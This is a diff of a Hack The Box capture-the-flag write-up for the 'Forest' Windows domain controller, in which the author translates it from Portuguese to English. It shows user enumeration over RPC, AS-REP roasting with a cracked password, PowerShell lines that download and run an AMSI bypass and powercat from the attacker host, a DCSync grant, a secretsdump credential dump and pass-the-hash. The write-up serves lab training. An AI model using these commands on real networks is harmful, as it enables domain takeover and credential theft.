@@ -1,7 +1,7 @@
 ---
 title: "Forest - HTB"
 categories: [HackTheBox, Easy]
-tags: [Easy,Windows,AD,DNS,LDAP,Kerberos,AS-REP,RPC,]
+tags: [Easy,Windows,AD,DNS,LDAP,Kerberos,AS-REP,RPC,DCSync]
 mermaid: false
 image: https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Forest.png
 ---
@@ -10,7 +10,8 @@ image: https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Forest.png
 
 [https://app.hackthebox.com/machines/Forest](https://app.hackthebox.com/machines/Forest)
 
-This is a easy windows machine.
+This is a easy windows machine. It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.
+
 
 **Have a good time!**
 
@@ -20,70 +21,13 @@ First step is to enumerate the box. For this we’ll use `nmap`.
 
 
 ```bash
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -p $ports 10.10.10.161
+ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
 ```
-    
-```
-PORT      STATE SERVICE      VERSION
-53/tcp    open  domain       Simple DNS Plus
-88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-10-18 12:52:23Z)
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf       .NET Message Framing
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49671/tcp open  msrpc        Microsoft Windows RPC
-49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-49677/tcp open  msrpc        Microsoft Windows RPC
-49684/tcp open  msrpc        Microsoft Windows RPC
-49706/tcp open  msrpc        Microsoft Windows RPC
-49958/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-Host script results:
-| smb2-time: 
-|   date: 2022-10-18T12:53:20
-|_  start_date: 2022-10-18T12:13:03
-|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m48s
-| smb-os-discovery: 
-|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
-|   Computer name: FOREST
-|   NetBIOS computer name: FOREST\x00
-|   Domain name: htb.local
-|   Forest name: htb.local
-|   FQDN: FOREST.htb.local
-|_  System time: 2022-10-18T05:53:16-07:00
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-| smb-security-mode: 
-|   account_used: <blank>
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: required
+[](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/scan-forest.png)
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 81.27 seconds
-zsh: segmentation fault  sudo nmap -sC -sV -p $ports 10.10.10.161
-```
-    
-
-Identificamos o domínio `htb.local`, então add no ***/etc/hosts***
+ 
+We identified the `htb.local` domain, so add it in **/etc/hosts**
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled.png)
 
@@ -91,7 +35,7 @@ Identificamos o domínio `htb.local`, então add no ***/etc/hosts***
 
 ## DNS - UDP/TCP 53
 
-Eu posso resolver `htb.local` e `forest.htb.local` a partir deste servidor DNS:
+I can to resolve `htb.local` and `forest.htb.local` from this DNS server:
 
 ```bash
 dig @10.10.10.161 htb.local
@@ -151,8 +95,7 @@ forest.htb.local.	3600	IN	A	10.10.10.161
 ;; MSG SIZE  rcvd: 73
 ```
     
-
-Tentei fazer uma transferência de zona, mas **sem sucesso!**
+I tried to do a zone transfer, but **without success**.
 
 ```bash
 dig axfr @10.10.10.161 htb.local`
@@ -168,7 +111,8 @@ dig axfr @10.10.10.161 htb.local`
 
 ## SMB - TCP 445
 
-Tentei enumerar com `smbmap` e `smbclient` para listar compartilhamentos sem senha, mas **sem sucesso!**
+I tried to enumerate with `smbmap` and `smbclient` to list shares without password, but **unsuccessful**.
+
 
 ```bash
 smbmap -H 10.10.10.161
@@ -193,13 +137,13 @@ SMB1 disabled -- no workgroup available
 
 ## RPC - TCP 445
 
-Enumeraremos o RPC 
+Enumerating the RPC
 
 ```bash
 rpcclient -U "" -N 10.10.10.161
 ```
 
-Listar os usuários:
+List the users:
 
 - `enumdomusers`
     
@@ -238,7 +182,7 @@ Listar os usuários:
     ```
     
 
-Listar os grupos:
+List the groups :
 
 - `enumdomgroups`
     
@@ -284,7 +228,7 @@ Listar os grupos:
     ```
     
 
-Vamos olhar os membros do grupo Domain Admin:
+Let's look at the members of the Domain Admin group:
 
 - `querygroup 0x200`
     
@@ -333,15 +277,15 @@ Vamos olhar os membros do grupo Domain Admin:
     ```
     
 
-O grupo `Domain Admin` tem apenas 1 membro, que é o `Administrator`.
-
+The `Domain Admin` group has only one member, which is the `Administrator`.
 
 
 ## AS-REP Roasting
 
-Agora, temos a lista de usuários do alvo.
 
-Colocaremos a lista num arquivo e tentaremos o Atttack As-Rep Roasting.
+Now I have the list of target users.
+
+I'll try the Attack As-Rep Roasting using the users list.
 
 ```bash
 cat users
@@ -387,7 +331,9 @@ $krb5asrep$23$svc-alfresco@HTB:754aaeb7cf647e5365424893ee7e7345$1f45e994ceeda5db
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-Senha do usuário **svc-alfresco** encontrada: **s3rvice**
+> User: **svc-alfresco** 
+>
+> Pass: **s3rvice**
 
 
 
@@ -414,56 +360,63 @@ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%201.png)
 
 
+# Post Exploration
 
-## Melhorando o shell
 
-Usamos o powercat para melhorar o shell:
+## Spawning Shell
+
+The impacket-psexec gives me a non-interactive shell. I used powercat.txt to get an interactive shell.
 
 ```powershell
-IEX(New-Object System.Net.WebClient).DownloadString('[http://10.10.14.2/powercat.ps1](http://10.10.14.2/powercat.ps1)'
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.2/amsi.txt')
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.2/powercat.txt')
 ```
 
-## BloodHound
 
-Baixando o sharphound pro alvo:
+## BLOODHOUND
+
+I downloaded and ran SharpHound.exe on the target. Its output transfer to kali and I used BloodHound to do the reading in graphical mode. Both tools were referenced in the chapter “Pentest Tools”.
+
+* Download:
 
 ```powershell
 powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.2//sharphound.exe','c:\\windows\\tasks\\sharphound.exe')
 ```
 
-Executando no alvo:
+* Running SharpHound.exe:
 
 ```powershell
-c:\\windows\\tasks\\sharphound.exe
+C:\Windows\Tasks\SharpHound.exe --CollectionMethods All
 ```
 
-Transferindo o resultado pro kali:
+* Transferring output to kali:
 
 ```bash
-impacket-smbserver samba . -smb2support
-```
-
-```powrshell
+## Kali:
+impacket-smbserver samba . -username kali -password kalii -smb2support
+## Target:
+net use \\192.168.49.106\samba kalii /user:kali
 copy 20221018071247_BloodHound.zip \\10.10.14.2\\samba
 ```
 
-Analisando o resultado:
+* Analyzing in BloodHound:
 
-Temos o caminho do sucesso na seção `Find Shortest Paths to Domain Admins`
+We have the road to success in the section `Find Shortest Paths to Domain Admins`
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%202.png)
 
-## Priv Esc
 
-### Entrando no grupo de permissões do Exchange Windows
+## Privilege Escalation (svc-alfresco → Administrator )
 
-Vamos inserir o usuário ***svc-alfresco*** ao grupo ***Exchange Windows Permissions:***
+### Entering the Exchange Windows Permissions Group
+
+Let's to insert the **svc-alfresco** user to **Exchange Windows Permissions:** group.
 
 ```powershell
 net group "Exchange Windows Permissions" svc-alfresco /add /domain
 ```
 
-ou podemos usar este comando:
+or we can to use this command:
 
 ```powershell
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
@@ -471,7 +424,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',
 Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco' -Credential $Cred
 ```
 
-Verificamos que o usuário foi inserido com sucesso.
+We verify that the user was insert with success.
 
 ```powershell
 net group "Exchange Windows Permissions"
@@ -486,9 +439,9 @@ The command completed successfully.
 ```
     
 
-Porém, após um tempo o usuário é apagado do grupo.
+However, after a while the user is deleted from the group.
 
-Então, faremos um comando só que adicionará o usuário ao grupo e depois concederá privilégios DCSync.
+So we'll do a command just add the user to the group and then grant DCSync privileges.
 
 ```powershell
 Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; 
@@ -500,10 +453,10 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
 
-Agora, estamos no grupo `Exchange Windows Permissions`  e podemos executar um ataque DCSync com o `mimikatz` ou `secretdump`. Usaremos o segundo.
+We are now in the `Exchange Windows Permissions` group and can run a DCSync attack with `mimikatz` or `secretdump`. We will use the second.
 
 ```bash
-impacket-secretsdump [svc-alfresco:s3rvice@10.10.10.161](mailto:svc-alfresco:s3rvice@10.10.10.161)
+impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161
 ```
     
 ```
@@ -612,10 +565,9 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up...
 ```
     
+We capture the hash of **Administrator.**.
 
-Capturamos o hash do ***Administrator.***
-
-Faremos um ataque PTH com PsExec:
+We will do a PTH attack with PsExec:
 
 ```bash
 impacket-psexec administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
@@ -623,6 +575,6 @@ impacket-psexec administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07c
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%203.png)
 
-# HABEMUS ROOT!!!
+**HABEMUS ROOT!!!**
 
 
